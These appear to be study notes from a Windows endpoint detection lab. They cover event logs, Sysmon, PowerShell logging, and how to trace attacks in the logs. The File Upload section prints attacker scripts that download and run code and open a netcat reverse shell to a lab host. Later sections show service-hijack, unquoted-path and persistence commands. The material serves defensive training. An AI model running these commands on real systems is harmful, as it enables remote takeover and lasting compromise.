# Windows Endpoint Introduction

## Command Prompt, VBScript, and Powershell

`@ECHO OFF` prevents the individual commands from displaying in the command prompt

`user_hostname.bat`

```bat
@ECHO OFF
TITLE Example Batch File
ECHO This batchfile will show Windows 10 Operating System information
systeminfo | findstr /C:"Host Name"
systeminfo | findstr /C:"OS Name"
systeminfo | findstr /C:"OS Version"
systeminfo | findstr /C:"System Type"
systeminfo | findstr /C:"Registered Owner"
PAUSE
```

`osinfo.vbs`

```vb
' List Operating System and Service Pack Information

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
 & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
 
Set colOSes = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
For Each objOS in colOSes
  Wscript.Echo "Computer Name: " & objOS.CSName
  Wscript.Echo "Caption: " & objOS.Caption 'Name
  Wscript.Echo "Version: " & objOS.Version 'Version & build
  Wscript.Echo "Build Number: " & objOS.BuildNumber 'Build
  Wscript.Echo "Build Type: " & objOS.BuildType
  Wscript.Echo "OS Type: " & objOS.OSType
  Wscript.Echo "Other Type Description: " & objOS.OtherTypeDescription
  WScript.Echo "Service Pack: " & objOS.ServicePackMajorVersion & "." & _
   objOS.ServicePackMinorVersion
Next
```

```bat
cscript osinfo.vbs
```

```pwsh
Get-ExecutionPolicy
Get-Help Get-CimInstance
Get-Alias gcim
Get-Module | Where-Object { $_.ModuleType -eq "Script" }
```

`hostinfo.ps1`

```pwsh
Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property CSName, Caption, Version,BuildNumber, BuildType, OSType, RegisteredUser, OSArchitecture, ServicePackMajorVersion, ServicePackMinorVersion

Get-Service | Where-Object { $_.Status -eq "Running" }
```

```pwsh
gcim -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

## Windows Event Log

Find event log files in `C:\Windows\System32\winevt\Logs`, where they are saved as `.evtx` files.

Use the built-in **Windows Event Viewer** to parse the logs.

- **Application** log includes events generated by Windows applications, such as when an application 'hangs' or is unresponsive.
- **Security** logs include authentication and other security-related activities.
- The **Setup** logs provide details about upgrade installations or replacements by Windows Update.
- The **System** logs contain native operating system behaviors that do not fit in any of the other categories, such as system restarts or the mounting of drives.

The **Application and Services Logs** provide detailed event logging of services and applications. They may be developed by Microsoft or 3rd parties who have developed their own providers and defined their own events which need to be tracked.

Each Windows event entry has a level, or **severity**:
- **Information** level indicates that the initiated activity has completed successfully.
- **Warning** level suggest that there is no immediate problem but one may arise in the future.
- **Error** and **Critical** messages both indicate failure, though Critical failures are more severe than Error-level events.

The Security logs include **Audit Success** and **Audit Failure** event levels. These can be configured in the Local Group Policy Editor, or applied from a group policy pushed from the Domain controller. They highlight all security control activity and track successes and failures.

2 major elements in the XML:
- Within the **System** element are tags such as Provider Name, EventID, and TimeCreated. The **Provider Name** indicates that the provider for **Security** logs is named **Microsoft-Windows-Security-Auditing**. 
- The **EventData** elements change with every type of event that is logged.

Event ID **4624** indicates that "An account was successfully logged on".
- **TargetUserName** tag indicates that the user logged on to our Windows endpoint.
- **LogonType** tag has the value "10". LogonType 10 indicates a **RemoteInteractive** logon. RemoteInteractive refers to the use of Remote Desktop services to access the Windows machine, using the Remote Desktop Protocol (RDP). LogonType 3 indicates that a user or computer logged on to this computer from the network.
- **IpAddress** tag contains the source IP of the remote connection.

Get the details about the 4 Windows logs (LogMode, a MaximumSizeInBytes, and a RecordCount)

```pwsh
Get-WinEvent -ListLog Application, Security, Setup, System
```

```pwsh
Get-WinEvent -LogName Security | Select-Object -first 10

Get-WinEvent -LogName 'Security' | Where-Object { $_.Id -eq "4624" } | Select-Object -Property TimeCreated,Message -first 10

Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime="4/23/2024 14:00:00"; EndTime="4/23/2024 14:30:00"; ID=4624} | Select-Object -Property TimeCreated,Message
```

Filter `LogonType == 10`

```pwsh
Get-WinEvent -FilterHashTable @{LogName='Security'; StartTime="4/23/2021 00:00:00"; EndTime="4/26/2021 07:00:00"; ID=4624 } | Where-Object { $_.properties[8].value -eq 10 } | Format-List
```

Event ID **1102**: Use "Clear Log..." to clear the Security logs
Event ID **4776**: The computer attempted to validate the credentials for an account.

## Sysmon

**Sysmon** can be deployed to a Windows endpoint and create its own events as a separate provider under **Applications and Services Logs**.

Windows Event **4688** and Sysmon Event **1** are both events related to new processes being created on the system. But the Sysmon Event 1 **EventData** contains file verification **hashes** that act as a fingerprint of the file that created the process.

The configuration file for Sysmon is separated into 2 major parts including a series of **configuration entries**, (or behaviors), and **event filtering entries**, which contain rules for all 27 Sysmon event types.

- **imphash** is a clever piece of forensic data that **hashes the file's characteristics rather than the file itself**. These characteristics include the libraries used by the executable + the order in which they are stored within the file for reference.
- The **CopyOnDeletePE** tag indicates if Sysmon should make a copy of portable executables that are deleted by any user.
- The **ArchiveDirectory** tag represents the directory path (from the root of the C drive) where deleted copies should be stored.

The **group relation** of OR to make each rule independent.

With respect to the previous rule group, a network connection matching those ports (8080, 443) can be ignored if they were initiated by either the Chrome or Edge web browsers.

`https://github.com/Neo23x0/sysmon-config`

`sysmonconfig-export.xml`

```xml
<Sysmon schemaversion="3.2">
  <HashAlgorithms>MD5,SHA256,IMPHASH</HashAlgorithms>
  <CopyOnDeletePE>True</CopyOnDeletePE>
  <ArchiveDirectory>BackupDeleted</ArchiveDirectory>
 <EventFiltering>
  <RuleGroup name="Process Rules" groupRelation="or">
    <ProcessCreate onmatch="exclude">
      <Image condition="is">C:\Program Files\Windows Media Player\wmplayer.exe</Image>
      <Image condition="is">C:\Windows\system32\powercfg.exe</Image>
  </RuleGroup>
  <RuleGroup name="Driver Rules" groupRelation="or">
    <Driverload onmatch="exclude">
      <Signature condition="begin with">AMD</Signature>
      <Signature condition="contains">microsoft</Signature>
      <Signature condition="contains">windows</Signature>
  </RuleGroup>
  <RuleGroup name="Network Process Rules" groupRelation="or">
    <NetworkConnect onmatch="exclude">
      <Image condition="end with">Chrome.exe</Image>
      <Image condition="end with">msedge.exe</Image>
    </NetworkConnect>
  </RuleGroup>
  <RuleGroup name="Network Port Rules" groupRelation="or">
    <NetworkConnect onmatch="include">
      <DestinationPort condition="is">8080</DestinationPort>
      <DestinationPort condition="is">443</DestinationPort>
    </NetworkConnect>
  </RuleGroup>
  </EventFiltering>
</Sysmon>
```

Dump the current configuration (confirms that Sysmon is installed and running)

```pwsh
.\Sysmon64.exe -c | Select-Object -first 10
```

Reconfigure an active Sysmon with a configuration file

```pwsh
.\Sysmon64.exe -c C:\sysmonconfig-export.xml
```

Example sysmon configuration file:

```xml
  <RuleGroup name="" groupRelation="or">
    <FileCreate onmatch="include">
    ...
      <TargetFilename condition="end with">.bat</TargetFilename>
    ...
```

```
"Test" | Out-File FileCreate.bat
```

Sysmon events are stored in **Applications and Services Logs/Microsoft/Windows/Sysmon/Operational**

```pwsh
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"
```

`Get-Sysmon.psm1`

```pwsh
function Get-SysmonEvent{
    param (
        $eventid,
        $start,
        $end
    )
    $filters = @{LogName = "Microsoft-Windows-Sysmon/Operational"}
    
    if ($eventid -ne $null) {
        $filters.ID = $eventid
    }
    
    if ($start -ne $null) {
        $filters.StartTime = $start
    }

    if ($end -ne $null) {
        $filters.EndTime = $end
    }
    Get-WinEvent -FilterHashtable $filters
}
```

```pwsh
Import-Module C:\Get-Sysmon.psm1
Get-Module | Where-Object { $_.ModuleType -eq "Script" }
```

We don't need to specify an Event ID

```pwsh
Get-SysmonEvent $null "04/28/2021 13:55:00" "04/28/2021 14:00:00"
```

Search for a **FileCreate** event (Sysmon Event ID 11)

```pwsh
Get-SysmonEvent 11 "4/28/2021 13:48:00" "4/28/2021 13:49:00" | Format-List
```

Search for a **ProcessCreate** event (Sysmon Event ID 1), filter out the ProcessId 2032

```pwsh
Get-SysmonEvent 1 $null "7/28/2021 13:48:42" | Where-Object { $_.properties[3].value -eq 2032 } | Format-List
```

## Remote Access with PowerShell Core

```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@192.168.51.50
```

```pwsh
Enter-PSSession 192.168.51.10 -Credential offsec -Authentication Negotiate
```

```bash
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /u:offsec /p:lab /v:192.168.51.10
```

# Windows Server Side Attacks

## Credential Abuse

### Suspicious Logins

Search for Logon events (Event ID **4624**) occurring over the course of 2 days where it is expected that no users will be logged in (such as a weekend).

**LogonType** 10 indicates a RemoteInteractive logon (the use of Remote Desktop services to access the Windows machine, using the RDP)

```pwsh
Get-WinEvent -FilterHashTable @{LogName='Security'; StartTime="4/23/2024 19:00:00"; EndTime="4/26/2024 07:00:00"; ID=4624 } | Where-Object { $_.properties[8].value -eq 10 } | Format-List
```

`Get-Security.psm1`

```pwsh
function Get-SecurityEvent{
    param (
        $eventid,
        $start,
        $end
    )
    $filters = @{LogName = "Security"}
    
    if ($eventid -ne $null) {
        $filters.ID = $eventid
    }
    if ($start -ne $null) {
        $filters.StartTime = $start
    }

    if ($end -ne $null) {
        $filters.EndTime = $end
    }
    Get-WinEvent -FilterHashtable $filters
}
```

Search for a **logoff** event (Event ID **4634**) where the **Logon ID** is 0x323466

```pwsh
Get-SecurityEvent 4634 "5/1/2021 03:21:26" "5/3/2021 07:00:00" | Where-Object { $_.properties[3].value -eq 0x323466 } | Format-List
```

### Brute-Force Logins

Get a list of all **failed Logon** events (Event ID **4625**) that occurred in the span of a single day

```pwsh
Get-SecurityEvent 4625 "5/6/2021 00:00:00" "5/7/2021 00:00:00"
```

**LogonType** 3 indicates a network-based logon. hydra uses Network-Level Authentication (NLA). NLA forces an authentication to take place before the RDP session is initiated.

The **Status** code C000006D indicates that the failure is due to a bad username or authentication information. Other error codes specify that the username is nonexistent or that the password was incorrect.

Since we have NLA enabled, look at the **SubStatus** code C000006A to determine the details. Both the Status and Substatus explain the authentication failure.

If we suspect logons are indicative of a brute force credential attack, extract Target User Name, Status, SubStatus, Logon Type, Workstation Name, and IP Address. 

```pwsh
Get-SecurityEvent 4625 "5/6/2021 00:00:00" "5/7/2021 00:00:00" | Format-List TimeCreated, @{Label = "Logon Type"; Expression = {$_.properties[10].value}}, @{Label = "Status"; Expression = {'{0:X8}' -f $_.properties[7].value}}, @{Label = "Substatus"; Expression = {'{0:X8}' -f $_.properties[9].value}}, @{Label = "Target User Name"; Expression = {$_.properties[5].value}}, @{Label = "Workstation Name"; Expression = {$_.properties[13].value}}, @{Label = "IP Address"; Expression = {$_.properties[19].value}}
```

Search for successful authentications from that IP in this time frame:

```pwsh
Get-SecurityEvent 4624 "5/6/2021 09:36:44" "5/6/2021 09:37:44" | Where-Object { $_.properties[18].value -eq "192.168.51.50" }
```

Event ID **4801**: A workstation being locked or workstation being unlocked.
**LogonType** 7: This workstation was unlocked.


## Web Application Attacks

IIS has a built-in logging mechanism that logs to `C:\inetpub\logs\LogFiles`. E.g. `C:\inetpub\logs\LogFiles\W3SVC1\u_ex210506.log.`

List the log files for the 1st instance (or site ID) of W3SVC1:

```pwsh
dir C:\inetpub\logs\LogFiles\W3SVC1
```

Any additional web service instances hosted by IIS would log under sequentially-numbered directories, such as W3SVC2, W3SVC3, etc.

Each log file begins with `u_ex` followed by a date code formatted as YYMMDD.


### Local File Inclusion

### Command Injection

The IIS log file reveals an HTTP POST to the vulnerable PATH used by the exploit. We don't see the POSTDATA in IIS logs, but we can confirm a direct attempt at posting data to this page at this particular time from 192.168.51.50. **Over 3700 milliseconds elapsed while executing the query**. If we had a baseline of 200-400 milliseconds for the amount of time this normally takes

=> A greater source of suspicion for anomalous activity.

Get any and all Sysmon events

```pwsh
Get-SysmonEvent $null "05/10/2021 16:02:00" "5/10/2021 16:03:00"
```

Search for Sysmon's ProcessCreate events

```pwsh
Get-SysmonEvent 1 "05/10/2021 16:02:33" "5/10/2021 16:02:35" | Format-List TimeCreated, @{Label = "CommandLine"; Expression = {$_.properties[10].value}}, @{Label = "User"; Expression = {$_.properties[12].value}}, @{Label = "ParentImage"; Expression = {$_.properties[20].value}}
```

When chaining processes with parent processes, use the process/parent process IDs located in the ProcessCreate events.

When anomalous activity is identified, trace from parent to parent until we find the origin of the activity.

### File Upload

`stage.bat`

```bat
@ECHO OFF
powershell -c "iex (New-Object System.Net.WebClient).DownloadString('http://192.168.51.50:8000/load.ps1')"
```

`load.ps1`

```pwsh
del stage.bat
wget http://192.168.51.50:8000/nc.exe -O /Windows/Temp/nc.exe
/Windows/Temp/nc.exe 192.168.51.50 4444 -e cmd.exe
```

=> Tracking the upload and execution of our `stage.bat` and `load.ps1` scripts

Since our IIS logs showed activity at 2:26:17 PM, query on all Sysmon events from 2:26 PM to 2:27 PM

```pwsh
Get-SysmonEvent $null "05/13/2021 14:26:00" "5/13/2021 14:27:00"
```

Gather all **ProcessCreate** events that occurred at the 17s mark. => 2 command injections downloading and running `stage.bat`.

```pwsh
Get-SysmonEvent 1 "5/13/2021 14:26:16" "5/13/2021 14:26:18" | Format-List TimeCreated, @{Label = "CommandLine"; Expression = {$_.properties[10].value}}, @{Label = "User"; Expression = {$_.properties[12].value}}, @{Label = "ParentImage"; Expression = {$_.properties[20].value}}
```

There were 2 **FileCreate** events in the same timeframe.

- `stage.bat` being written via `certutil.exe`.

- A PowerShell script in `C:\Windows\Temp` is an artifact of using `Invoke-Expression` to read in a PowerShell script.

```pwsh
Get-SysmonEvent 11 "5/13/2021 14:26:16" "5/13/2021 14:26:18" | Format-List @{Label = "Rule"; Expression = {$_.properties[0].value}}, @{Label = "PID"; Expression = {$_.properties[3].value}},@{Label = "Image"; Expression = {$_.properties[4].value}}, @{Label = "TargetFile"; Expression = {$_.properties[5].value}}
```

We have the PID for PowerShell (6784).

Any **ProcessCreate** events with this PID can be traced back to this event => extract the Process ID (PID) and the Parent Process ID (PPID):

```pwsh
Get-SysmonEvent 1 "5/13/2021 14:26:17" "5/13/2021 14:26:19" | Format-List TimeCreated, @{Label = "PID"; Expression = {$_.properties[3].value}}, @{Label = "PPID"; Expression = {$_.properties[19].value}}, @{Label = "CommandLine"; Expression = {$_.properties[10].value}}, @{Label = "User"; Expression = {$_.properties[12].value}}, @{Label = "ParentImage"; Expression = {$_.properties[20].value}}
```

Search for NetworkConnect events

```pwsh
Get-SysmonEvent 3 "5/13/2021 2:26:18" "5/13/2021 2:26:20" | Format-List @{Label = "PID"; Expression = {$_.properties[3].value}}, @{Label = "Image"; Expression = {$_.properties[4].value}}, @{Label = "User"; Expression = {$_.properties[5].value}}, @{Label = "Source IP"; Expression = {$_.properties[9].value}}, @{Label = "Source Port"; Expression = {$_.properties[11].value}}, @{Label = "Destination IP"; Expression = {$_.properties[14].value}}, @{Label = "Destination Port"; Expression = {$_.properties[16].value}}
```

### Binary Attacks

```pwsh
Start-Service -Name "Sync Breeze Enterprise"
Get-Service -Name "Sync Breeze Enterprise" | Format-List -Property Status,Name,DisplayName
```

ProcessCreate event: A **command prompt** was initiated by `syncbrs.exe`. The User field indicates that the **SYSTEM** user started the command prompt.

NetworkConnect events: connections from our attacker machine to SyncBreeze on port 8080. The reverse shell also left traces as it called back to our Kali VM on port 4444.


### Windows Defender Exploit Guard (WDEG)

Windows Defender Exploit Guard (WDEG) is disabled by default. It was developed to address file-less malware attacks, or malware that operates almost exclusively in memory.

WDEG has 4 major components:
1. **Attack Surface Reduction** (ASR) addresses file-less malware attacks that hide within Microsoft Office documents. ASR can also block executable content or network communications from Adobe Reader, VBScript, and JavaScript.

2. **Controlled folder access**: prevent applications from writing or making changes to directories specified by policy (Modern ransomware often maliciously encrypts user data). By default, the home directory of users (C:\Users\<user account>) are protected.

3. **Network protection** relies on Microsoft's Intelligent Security Graph as a threat intelligence resource for domain and IP reputation. Anything less-than-reputable can be halted independently of what process or application initiated it.

4. **Exploit protection**: Administrators must import an XML configuration file to set this up.

=> Create a rule to enact Data Execution Prevention (DEP) for SyncBreeze to render the exploit inoperable. Rules can be created through the Windows GUI, by importing an XML Configuration, or with PowerShell.

Validate API Invocation (or **CallerCheck**) is a protection mechanism that watches how API calls are invoked. This control will only allow functions to be accessed with a **call** assembly instruction, rather than a **return** instruction.

Using return instructions to execute API calls is known as Return-Oriented Programming (ROP) and is used to bypass data execution prevention.

Enable exploit protection for a specific process (The exploit will fail)

```pwsh
Set-ProcessMitigation -Name 'C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe' -Enable EnableRopCallerCheck

Get-ProcessMitigation -Name 'C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe'

Restart-Service -Name "Sync Breeze Enterprise"
```

The event that is generated will not appear in Windows Security event logs, but rather in the **Security-Mitigations** logs.

```pwsh
Get-WinEvent -FilterHashTable @{LogName = 'Microsoft-Windows-Security-Mitigations/UserMode'; StartTime = '5/25/2021 13:42:28'; EndTime = '5/25/2021 13:42:30'} | Format-List -Property Id, TimeCreated, LevelDisplayName, Message
```

Turn auditing on for Windows exploit protection. (should not block the activity but still generate events.)
- Remove our SyncBreeze configuration
- Reconfigure our exploit protections to only audit the return-oriented API calls used by the SyncBreeze exploit.

```pwsh
Remove-Item -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\syncbrs.exe'

Set-ProcessMitigation -Name 'C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe' -Enable AuditEnableRopCallerCheck

Restart-Service -Name "Sync Breeze Enterprise"
```

# Windows Client Side Attacks

Query for the ProcessCreate event: PowerShell was started with a base64-encoded payload. The CommandLine field shows the abbr. payload as executed on the command line. The Parent Process ID belongs to Microsoft Word, and the ParentCommandLine reveals the Word document `Engineer_Resume.doc`.

```pwsh
Get-SysmonEvent 1 "6/17/2021 15:10:38" "6/17/2021 15:10:40" | Format-List
```

Query for the FileCreate event: A temporary PowerShell file is written to `C:\Users\offsec\AppData\Local\Temp`

```pwsh
Get-SysmonEvent 11 "6/17/2021 15:10:38" "6/17/2021 15:10:40" | Format-List
```

Query for the **DNSEvent** created by our attachnment (Event ID 22)

```pwsh
Get-SysmonEvent 22 "6/17/2021 15:10:41" "6/17/2021 15:11:00" | Format-List
```

2 NetworkConnect events: filter on the destination IP `192.168.51.50` (PowerShell is initiating separate network sessions as a result of the two-stage malware infection)

```pwsh
Get-SysmonEvent 3 "6/17/2021 15:10:41" "6/17/2021 15:11:00" | Where-Object { $_.properties[14].value -eq "192.168.51.50" } | Format-List
```

## PowerShell Logging

3 different types of PowerShell logging: Module, Script Block, and Transcription.

Launch the **Local Group Policy Editor**, gpedit.msc, and navigate to `Local Computer Policy > Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell`

### PowerShell Module Logging

Change the setting `Turn on Module Logging` from Not Configured to Enabled.

This also activates the **Show...** button next to **Module Names** > specify what modules this policy needs to log.

Rather than list out every possible module, enter a wildcard ("*") character so that we can log all PowerShell modules.

Collect information on all currently running processes

```pwsh
Get-WmiObject -Class Win32_Process | Format-Table ProcessId, ParentProcessId, Name; Write-Host (Get-Date)
```

Event ID for pipeline execution events enabled by module logging is **4103**.

```pwsh
Get-WinEvent -FilterHashtable @{Logname='Microsoft-Windows-PowerShell/Operational'; StartTime="6/14/2021 13:25:52"; EndTime="6/14/2021 13:25:54"; ID=4103} | Format-List
```

- Command Name indicates which cmdlet initiated this pipeline execution. Or the Script Name.
- Sequence Number tracks the order in which PowerShell events execute.
- Pipeline ID tracks commands within a given pipeline.

We could trace an entire series of PowerShell commands using the Pipeline ID, and order them based on the Sequence Number.


### PowerShell Script Block Logging

Open `gpedit.msc` and navigate to `Local Computer Policy > Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell`.

Change the setting `Turn on PowerShell Script Block Logging` from Not Configured to Enabled.

Uncheck the option to **Log script block execution start / stop events**.

The use of script block logging to help with the **deobfuscation** of PowerShell commands.

```pwsh
{ "This is a script block" }; Write-Host (Get-Date)
```

The Event ID for remote command execution events enabled by script block logging is **4104**.

```pwsh
Get-WinEvent -FilterHashtable @{Logname='Microsoft-Windows-PowerShell/Operational'; StartTime="06/15/2021 14:49:42"; EndTime="06/15/2021 14:49:44"; ID=4104} | Format-List
```

Use PowerShell to encode a command

```pwsh
$Command = 'Write-Host (Get-Date); Get-Hotfix'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
$EncodedCommand = [Convert]::ToBase64String($Bytes)
$EncodedCommand
```

```pwsh
powershell -Encoded <$EncodedCommand>
```

### PowerShell Transcription

PowerShell transcription will generate full records of a PowerShell session, with all input and output stored in a text file.

To enable transcription for PowerShell, open `gpedit.msc` and navigate to `Local Computer Policy > Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell`.

Change the setting **Turn on Powershell Transcription** from Not Configured to Enabled.

Also select the checkbox for **Include Evocation Headers** so that timestamps are produced for each command in our transcripts.

navigate to the `C:\Users\offsec\Documents\YYYYMMDD` directory, we'll find a text file titled `PowerShell_transcript.HOSTNAME.UNIQUEID.YYYYMMDDHHMMSS.txt`

### Case Study: Phishing Attacks

`Import-Module C:\Sysmon\Get-PSLog.psm1`

```pwsh
function Get-PSLogEvent{
    param (
        $eventid,
        $start,
        $end
    )
    $filters = @{LogName = "Microsoft-Windows-PowerShell/Operational"}
    
    if ($eventid -ne $null) {
        $filters.ID = $eventid
    }
    if ($start -ne $null) {
        $filters.StartTime = $start
    }

    if ($end -ne $null) {
        $filters.EndTime = $end
    }

    Get-WinEvent -FilterHashtable $filters
}
```

```pwsh
Get-PSLogEvent 4104 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-Table Timecreated, LevelDisplayName, Message
Get-PSLogEvent 4104 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-List
```

```pwsh
Get-PSLogEvent 4103 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-Table TimeCreated, LevelDisplayName, Message
Get-PSLogEvent 4103 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-List
```

Extracting the Payload from Each Module Log Event Message

```pwsh
Get-PSLogEvent 4103 "6/15/2021 15:44:00" "6/15/2021 15:44:59" | Format-List TimeCreated, @{Label = "Payload"; Expression = {$_.properties[2].value}}
```

Obfuscate a PowerShell command

```pwsh
Import-Module ./Invoke-Obfuscation/Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

Choose Ticks as our obfuscation technique for the command tokens.
Arguments can also be obfuscated using random case, concatenation of strings, and **reordering** the text altogether

```
SET SCRIPTBLOCK Get-CimInstance Win32_ComputerSystem | Select-Object -Property Name, PrimaryOwnerName, Domain, TotalPhysicalMemory, Model, Manufacturer; Write-Host (Get-Date)
back
show
```

CommandLineSyntax:

```pwsh
Invoke-Obfuscation -ScriptBlock {Get-CimInstance Win32_ComputerSystem | Select-Object -Property Name, PrimaryOwnerName, Domain, TotalPhysicalMemory, Model, Manufacturer; Write-Host (Get-Date)} -Command 'Token\Command\1,Token\Argument\4' -Quiet
```

Query script block events => the obfuscation makes it harder for us to understand what's happening

```pwsh
Get-PSLogEvent 4104 "6/21/2021 19:35:06" "6/21/2021 19:35:08" | Format-List
```

Query module log events within the same time range 

```pwsh
Get-PSLogEvent 4103 "6/21/2021 19:35:06" "6/21/2021 19:35:08" | Format-List
```

Use **Revoke-Obfuscation** (`https://github.com/danielbohannon/Revoke-Obfuscation`) to detect obfuscated PowerShell commands and scripts. In some cases, it can even help reconstruct an obfuscated PowerShell script that has been executed.

```pwsh
Import-Module C:\tools\windows_client_side_attacks\Revoke-Obfuscation\Revoke-Obfuscation.psm1
```

To export PowerShell logs from the command line, use **wevtutil**, a command-line utility for listing and saving event logs in an XML-based event file format (`.evtx`).

```pwsh
wevtutil export-log Microsoft-Windows-PowerShell/Operational C:\users\offsec\Desktop\pwsh_export.evtx
```

Reassemble script blocks from script block (ID: 4104) events

```pwsh
Get-RvoScriptBlock -Path 'C:\Users\offsec\Desktop\pwsh_export.evtx' -Verbose
```

# Windows Privilege Escalation

```pwsh
.\accesschk64.exe -uws "Everyone" "C:\Program Files (x86)\"
```

```pwsh
Import-Module .\PowerUp.ps1
Invoke-AllChecks | Format-List
```

## Bypassing UAC

Output the modify registry events, whose IDs are equal to **13**.

```pwsh
Get-SysmonEvent 13 "06/28/2021 13:41:35" "06/28/2021 13:41:37" | Format-List
```

ProcessCreate events

```pwsh
Get-SysmonEvent 1 "06/28/2021 13:41:35" "06/28/2021 13:41:37" | Format-List
```

Query the PowerShell module log entries

```pwsh
Get-PSLogEvent 4103 "6/28/2021 13:41:35" "6/28/2021 13:41:45"
Get-PSLogEvent 4103 "6/28/2021 13:41:35" "6/28/2021 13:41:45" | Format-List
```

Use the `Where-Object` cmdlet on the **Image** field containing the string "fodshell"

```pwsh
Get-SysmonEvent 1 "06/28/2021 13:41:00" "06/28/2021 13:42:00" | Where-Object { $_.properties[4].value -like "*fodshell*" } | Format-List
```

## Escalating to SYSTEM

### Service Creation

Use Windows services and named pipes to escalate privileges (Meterpreter getsystem command)

Event with ID 4697: A service was installed in the system

```pwsh
Get-SecurityEvent 4697 "6/30/2021 12:49:31" "6/30/2021 12:49:33" | Format-List
```

Display RegistryEvent entries

```pwsh
Get-SysmonEvent 13 "06/30/2021 12:49:31" "06/30/2021 12:49:33" | Format-List
```

1. writes 0x00000003 to the Start key of the hvaukz service. This sets the new service to a **Manual** start-up, rather than when the system boots.
2. sets the **ImagePath** key of the **hvaukz** service to the named pipe.
3. changes the value of the Start key for the hvaukz service. The value 0x00000004 indicates that the service will be changed from Manual to **Disabled**.

```pwsh
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\hvaukz
```

View the ProcessCreate event

```pwsh
Get-SysmonEvent 1 "06/30/2021 12:49:31" "06/30/2021 12:49:33" | Format-List
```

### Attacking Service Permissions

When querying services with Service Control in PowerShell, use the `sc.exe` filename and not just `sc`.

The `Set-Content` cmdlet in PowerShell can be abbreviated with `sc`, and the PowerShell prompt prioritizes cmdlets over Windows commands.

```pwsh
sc.exe qc Serviio
```

Enumerate the permissions of installed services

* -c argument to specify a Windows Service by name, the wildcard * to query all Windows services
* -l for the full security descriptor

```pwsh
.\accesschk64.exe -c Serviio -l
```

```pwsh
C:\Windows\system32\sc.exe config Serviio binpath= 'C:\tools\servshell_443.exe'
net start serviio
```

Examine the ProcessCreate event (sc.exe made the configuration change)

```pwsh
Get-SysmonEvent 1 "7/1/2021 10:42:00" "7/1/2021 10:42:59" | Format-List
```

Review the RegistryEvent entry (HKLM\System\CurrentControlSet\Services\Serviio\ImagePath Windows Registry key is changed)

```pwsh
Get-SysmonEvent 13 "7/1/2021 10:42:00" "7/1/2021 10:42:59" | Format-List
```

```pwsh
Get-SysmonEvent 1 "7/1/2021 10:56:09" "7/1/2021 10:56:11" | Format-List @{ Label = 'UtcTime'; Expression = { $_.properties[1].value }}, @{ Label = 'Image'; Expression = { $_.properties[4].value }}, @{ Label = 'ProcessId'; Expression = { $_.properties[3].value }}, @{ Label = 'CommandLine'; Expression = { $_.properties[10].value }}, @{Label = 'User'; Expression = { $_.properties[12].value }}, @{ Label = 'ParentImage'; Expression = { $_.properties[20].value }}, @{ Label = 'ParentProcessId'; Expression = { $_.properties[19].value }}
```

### Leveraging Unquoted Service Paths

```pwsh
Import-Module .\PowerUp.ps1
Get-UnquotedService
```

```pwsh
sc.exe qc IOBitUnSvr
...
BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
```

```pwsh
copy .\servshell_443.exe 'C:\Program Files (x86)\IObit\IOBit.exe'
shutdown -r -t 0
```

FileCreate events

```pwsh
Get-SysmonEvent 11 "7/8/2021 10:49:33" "7/8/2021 10:49:35" | Format-List
```

Search across all ProcessCreate events where the Image field contains the wildcarded filename `IOBit.exe`

```pwsh
Get-SysmonEvent 1 | Where-Object { $_.properties[4].value -like "*IOBit.exe*" } | Format-List
```

# Windows Persistence

## Persisting via Windows Service

Creates a new service named "VindowsUpdate".
- (start= auto) indicates that the service should start after the operating system boots, even if no users have logged on.
- error= ignore parameter indicates that service errors are logged without notifying the user or interrupting system startup.
- binpath= C:\tools\windows_persistence\prst_servshell443.exe" details the location of the binary.

```pwsh
sc.exe create VindowsUpdate start= auto error= ignore binpath= C:\tools\windows_persistence\prst_servshell443.exe
shutdown -r -t 0
```

Query all events in the Security log

```pwsh
Get-SecurityEvent $null "10/29/2021 11:43:00" "10/29/2021 11:44:00" | Format-List
```

An event entry (Event Id 4697) indicating that a service was installed in the system.

Note that `prst_servshell443.exe` was on the target already. Attackers trying to create their own service will often upload their preferred service binary first. => search for **FileCreate** events.

1 ProcessCreate event (`sc.exe`) and 2 RegistryEvent entries.

```pwsh
Get-SysmonEvent 1 "10/29/2021 11:43:49" "10/29/2021 11:43:51" | Format-List
```

```pwsh
Get-SysmonEvent 13 "10/29/2021 11:43:49" "10/29/2021 11:43:51" | Format-List
```

The Service Control Manager (`services.exe`) has added new values in the `HKEY_LOCAL_MACHINE` (HKLM) hive.

- The **Start** value created in the **VindowsUpdate** key. The Start value contains a single DWORD for the **Startup** type. The 32-bit value of "2" represents the **AUTO** Startup type that we set for this service.

- The **ImagePath** value of our service configuration, which is the full path to `prst_servshell443.exe`.


Filter on ProcessCreate events where the Image field contains the filename `prst_servshell443.exe`

```pwsh
Get-SysmonEvent 1 | Where-Object { $_.properties[4].value -like "*prst_servshell443.exe*" } | Format-List
```

Find any other ProcessCreate events where the ParentProcessId (PPID) matches the ProcessId of prst_servshell443.exe (3140)

```pwsh
Get-SysmonEvent 1 "10/29/2021 12:33:41" | Where-Object { $_.properties[19].value -eq 3140 } | Format-List
```

